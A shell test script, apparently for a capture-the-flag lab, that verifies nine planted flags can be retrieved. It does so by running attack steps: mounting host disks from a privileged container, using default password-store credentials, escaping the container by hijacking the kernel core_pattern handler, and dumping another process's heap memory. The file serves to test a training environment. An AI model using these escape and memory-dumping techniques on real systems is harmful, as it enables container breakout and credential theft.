#!/bin/sh
#
# flags.t
# Make sure our flags work
# By J. Stuart McMurray
# Created 20241123
# Last Modified 20241123

set -e
. $SHMORE

cd $(dirname $0)/..
. t/run_in_job.subr

# Initial access flag
tap_is \
        "$(run_in_job cat /usr/lib/001.inital_access.flag)" \
        "$(cat 001.inital_access.flag)" \
        "Initial access" \
        "$0" "$LINENO"

# Flag in environment
tap_is \
        "$(run_in_job '
                grep \
                        --null-data \
                        --text \
                        "FLAG 002" </proc/$$/environ |
                cut -f 2 -d =
        ')" \
        "$(grep FLAG_002 <default_env_vars | cut -f 2 -d =)" \
        "Flag in environment" \
        "$0" "$LINENO"

# Flag in argv 
tap_is \
        "$(run_in_job '
                egrep \
                        --no-filename \
                        --null-data \
                        --only-matching \
                        --text \
                        "FLAG 003 - [a-zA-Z ]+" \
                        /proc/*/cmdline |
                cut -f 2 -d =
        ')" \
        "$(egrep -o 'FLAG 003 - [A-Za-z ]+' start_build.sh)" \
        "Flag in argv" \
        "$0" "$LINENO"

# Flag in code repo 
tap_is \
        "$(run_in_job '
                git clone --quiet git@codeserver:central_iac.git &&
                cat central_iac/004.repo.flag
        ')" \
        "$(cat ../codeserver/004.repo.flag)" \
        "Flag in argv" \
        "$0" "$LINENO"

# Flag on the host disk
tap_is \
        "$(run_in_priv_job '
                F=/tmp/m/usr/include/005.hostdisk.flag
                mkdir /tmp/m &&
                grep -v ^major </proc/partitions |
                egrep -v '^$' |
                while read MAJ MIN REST; do
                        rm -f /tmp/d; mknod /tmp/d b "$MAJ" "$MIN"
                        if ! mount /tmp/d /tmp/m 2>/dev/null; then
                                continue
                        fi
                        if [ -f "$F" ]; then
                                cat "$F"
                        fi;
                        umount /tmp/m
                done
        ')" \
        "$(cat ../../flags/005.hostdisk.flag)" \
        "Flag on host disk" \
        "$0" "$LINENO"

# Flag served by the passwordstore
PSU="$(cat ../passwordstore/default_username)"
PSP="$(cat ../passwordstore/default_password)"
tap_is \
        "$(run_in_job curl \
                --silent \
                --user "$PSU:$PSP" \
                http://passwordstore | grep flag)" \
        "flag" \
        "Flag listed in passwordstore" \
        "$0" "$LINENO"
tap_is \
        "$(run_in_job 'curl \
                --silent \
                --user '"$PSU:$PSP"' \
                http://passwordstore/flag; echo')" \
        "$(egrep -o \
                'FLAG 006 - [A-Za-z ]+' \
                ../passwordstore/passwords.json.m4)" \
        "Flag available in passwordstore" \
        "$0" "$LINENO"

# Flag in passwordstore's container
tap_is \
        "$(run_in_priv_job '
                cat >/esc <<"_eof"
#!/bin/sh
exec >$0.out 2>&1
cat /proc/$(pidof passwordstore)/root/007.procpidroot.flag
_eof
                chmod 0755 /esc
                echo "|/proc/%P/root/esc" >/proc/sys/kernel/core_pattern
                sh -c '\''kill -SEGV $$'\'' >/dev/null 2>&1|| true
                echo core >/proc/sys/kernel/core_pattern
                cat /esc.out
        ')" \
        "$(cat ../passwordstore/007.procpidroot.flag)" \
        "Flag in passwordstore's filesystem" \
        "$0" "$LINENO"

# Flag in passwordstore's binary
tap_is \
        "$(run_in_priv_job '
                cat >/esc <<"_eof"
#!/bin/sh
exec >$0.out 2>&1
egrep -ao "FLAG 008 - [A-Za-z ]+" /proc/$(pidof passwordstore)/exe
_eof
                chmod 0755 /esc
                echo "|/proc/%P/root/esc" >/proc/sys/kernel/core_pattern
                sh -c '\''kill -SEGV $$'\'' >/dev/null 2>&1|| true
                echo core >/proc/sys/kernel/core_pattern
                cat /esc.out
        ')" \
        "$(cat ../passwordstore/008.bakedin.flag)" \
        "Flag in passwordstore's binary" \
        "$0" "$LINENO"

# Flag in process memory
tap_is \
        "$(run_in_priv_job '
                cat >/esc <<"_eof"
#!/bin/sh
exec >$0.out 2>&1
PID=$(pgrep perl)
START=$(grep heap /proc/$PID/maps | cut -f 1 -d -)
END=$(grep heap /proc/$PID/maps | cut -f 1 -d " " | cut -f 2 -d -) 
dd \
        bs=1 \
        count=$((0x${END}-0x${START})) \
        if=/proc/$PID/mem \
        skip=$((0x$START)) \
        status=none |
strings |
grep FLAG
_eof
                chmod 0755 /esc
                echo "|/proc/%P/root/esc" >/proc/sys/kernel/core_pattern
                sh -c '\''kill -SEGV $$'\'' >/dev/null 2>&1|| true
                echo core >/proc/sys/kernel/core_pattern
                cat /esc.out
        ')" \
        "$(cat ../passwordstore/009.mem.flag)" \
        "Flag in passwordstore's binary" \
        "$0" "$LINENO"

tap_is \
        "$(run_in_priv_job cat /proc/sys/kernel/core_pattern)" \
        core \
        "Core pattern is back to core" \
        "$0" "$LINENO"

# vim: ft=sh
